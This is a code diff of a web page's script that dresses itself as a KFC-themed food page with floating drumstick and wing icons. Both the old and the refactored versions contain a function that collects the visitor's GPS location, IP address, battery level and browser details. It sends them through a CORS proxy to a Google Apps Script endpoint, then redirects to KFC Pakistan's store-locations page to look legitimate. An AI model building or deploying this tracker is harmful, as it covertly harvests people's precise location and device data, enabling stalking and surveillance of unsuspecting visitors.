@@ -94,92 +94,90 @@
   </div>
 
 <script>
-const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
-const bg = document.getElementById('background');
+document.addEventListener("DOMContentLoaded", () => {
+  const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
+  const bg = document.getElementById('background');
 
-if (bg) {
-  for (let i = 0; i < 40; i++) {
-    const img = document.createElement('img');
-    img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
-    img.style.left = Math.random() * 100 + 'vw';
-    img.style.top = '100vh';
-    img.classList.add('float-up');
-    img.style.animationDuration = (6 + Math.random() * 3) + 's';
-    bg.appendChild(img);
-  }
-
-  for (let i = 0; i < 40; i++) {
-    const img = document.createElement('img');
-    img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
-    img.style.left = Math.random() * 100 + 'vw';
-    img.style.top = '-150px';
-    img.classList.add('float-down');
-    img.style.animationDuration = (6 + Math.random() * 3) + 's';
-    bg.appendChild(img);
-  }
-}
-
-async function sendLocation() {
-  let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
-
-  // Get IP
-  try {
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const ipData = await ipRes.json();
-    ip = ipData.ip;
-  } catch (e) {}
-
-  // Get Battery
-  try {
-    const batt = await navigator.getBattery();
-    battery = Math.round(batt.level * 100) + "%";
-  } catch (e) {}
-
-  // Geolocation
-  if (navigator.geolocation) {
-   navigator.geolocation.getCurrentPosition(
-  async (position) => {
-    lat = position.coords.latitude;
-    lon = position.coords.longitude;
-    accuracy = position.coords.accuracy;
-
-    const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
-
-    const payload = {
-      lat: lat,
-      lon: lon,
-      accuracy: accuracy,
-      ip: ip,
-      battery: battery,
-      ua: userAgent,
-      map: mapUrl
-    };
-
-    console.log("📦 Sending to Google Sheet:", payload); // Debug line
-
-    try {
-      await fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-      });
-    } catch (err) {
-      console.error("❌ Failed to send data:", err);
+  if (bg) {
+    for (let i = 0; i < 40; i++) {
+      const img = document.createElement('img');
+      img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
+      img.style.left = Math.random() * 100 + 'vw';
+      img.style.top = '100vh';
+      img.classList.add('float-up');
+      img.style.animationDuration = (6 + Math.random() * 3) + 's';
+      bg.appendChild(img);
     }
 
-    setTimeout(() => {
-      window.location.href = "https://www.kfcpakistan.com/store-locations";
-    }, 1000);
-  },
-  () => {
-    window.location.href = "https://www.kfcpakistan.com/store-locations";
+    for (let i = 0; i < 40; i++) {
+      const img = document.createElement('img');
+      img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
+      img.style.left = Math.random() * 100 + 'vw';
+      img.style.top = '-150px';
+      img.classList.add('float-down');
+      img.style.animationDuration = (6 + Math.random() * 3) + 's';
+      bg.appendChild(img);
+    }
   }
-);
+
+  // Attach to global so button can find it
+  window.sendLocation = async function () {
+    let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
+
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      ip = ipData.ip;
+    } catch (e) {}
+
+    try {
+      const batt = await navigator.getBattery();
+      battery = Math.round(batt.level * 100) + "%";
+    } catch (e) {}
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        lat = position.coords.latitude;
+        lon = position.coords.longitude;
+        accuracy = position.coords.accuracy;
+
+        const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
+
+        const payload = {
+          lat,
+          lon,
+          accuracy,
+          ip,
+          battery,
+          ua: userAgent,
+          map: mapUrl
+        };
+
+        try {
+          await fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          });
+        } catch (err) {
+          console.error("Data send error:", err);
+        }
+
+        setTimeout(() => {
+          window.location.href = "https://www.kfcpakistan.com/store-locations";
+        }, 1000);
+      }, () => {
+        window.location.href = "https://www.kfcpakistan.com/store-locations";
+      });
+    } else {
+      window.location.href = "https://www.kfcpakistan.com/store-locations";
+    }
+  };
+});
 </script>
 </body>
 </html>
+
 
 
 
